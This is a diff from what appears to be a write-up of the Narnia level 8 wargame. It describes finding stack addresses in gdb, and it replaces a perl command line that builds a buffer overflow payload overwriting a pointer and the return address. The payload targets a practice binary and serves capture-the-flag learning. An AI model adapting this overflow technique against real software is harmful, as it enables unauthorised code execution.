@@ -23,15 +23,6 @@ addr of LVL8: 0xffffdfa5
 
 Go into gdb, disassemble func(), set a break point right before exit, run with 20 A's as arg, display 20 values below $esp, get the address after the last 0x41414141 string for me it is (0xffffd790). In our actual payload we will be writing 12 more bytes so we need to subtract 12 from this (0xffffd78c).
 
-
-
-
-
-
-narnia8@gibson:/narnia$ perl -e 'printf("%8x\n", 0xffffaed7 - 12)'
-ffffaecb  
-./narnia8 $(perl -e 'print "AAAAAAAAAAAAAAAAAAAA"') | xxd   
-
-./narnia8 $(perl -e 'print "AAAAAAAAAAAAAAAAAAAA" . "\xcb\xae\xff\xff" . "AAAA" . "\xa5\xdf\xff\xff"')  
+./narnia8 $(perl -e 'print "AAAAAAAAAAAAAAAAAAAA" . "\x8c\xd7\xff\xff" . "AAAA" . "\xa5\xdf\xff\xff"')  
 
 
